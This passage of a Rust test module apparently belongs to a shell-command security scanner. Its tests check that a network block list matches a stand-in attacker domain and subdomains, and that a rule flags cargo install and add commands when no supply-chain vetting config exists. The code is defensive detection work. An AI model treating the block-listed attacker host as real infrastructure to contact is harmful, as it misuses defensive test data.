        assert!(matches_network_list("sub.evil.com", &list));
        assert!(!matches_network_list("notevil.com", &list));
        assert!(!matches_network_list("good.com", &list));
    }

    #[test]
    fn test_vet_not_configured_fires_without_supply_chain() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let findings = check(
            "cargo install serde_json",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(findings
            .iter()
            .any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_not_configured_suppressed_with_supply_chain() {
        let dir = tempfile::tempdir().unwrap();
        let sc_dir = dir.path().join("supply-chain");
        std::fs::create_dir_all(&sc_dir).unwrap();
        std::fs::write(sc_dir.join("config.toml"), "").unwrap();
        let cwd = dir.path().to_str().unwrap();
        let findings = check(
            "cargo install serde_json",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(!findings
            .iter()
            .any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_not_configured_skips_non_install() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let findings = check(
            "cargo build",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(!findings
            .iter()
            .any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_detects_cargo_with_flags() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let f1 = check(
            "cargo --locked install serde",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(f1.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
        let f2 = check(
            "cargo +nightly add tokio",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(f2.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
        let f3 = check(
            "cargo -Z sparse-registry install serde",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(f3.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_skipped_in_paste_context() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let findings = check(
            "cargo install serde_json",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Paste,
        );
        assert!(!findings
            .iter()
            .any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_no_false_positive_on_non_install_subcommand() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let f1 = check(
            "cargo test --package add",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(!f1.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
        let f2 = check(
            "cargo build install",
            ShellType::Posix,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(!f2.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
    }

    #[test]
    fn test_vet_detects_cargo_exe_windows_path() {
        let dir = tempfile::tempdir().unwrap();
        let cwd = dir.path().to_str().unwrap();
        let f1 = check(
            r"C:\Users\dev\.cargo\bin\cargo.exe install serde",
            ShellType::PowerShell,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(
            f1.iter().any(|f| f.rule_id == RuleId::VetNotConfigured),
            "should detect cargo.exe with Windows backslash path"
        );
        let f2 = check(
            r"C:\Users\dev\.cargo\bin\CARGO.EXE install serde",
            ShellType::PowerShell,
            Some(cwd),
            ScanContext::Exec,
        );
        assert!(
            f2.iter().any(|f| f.rule_id == RuleId::VetNotConfigured),
            "should detect CARGO.EXE case-insensitively"
        );
    }
}
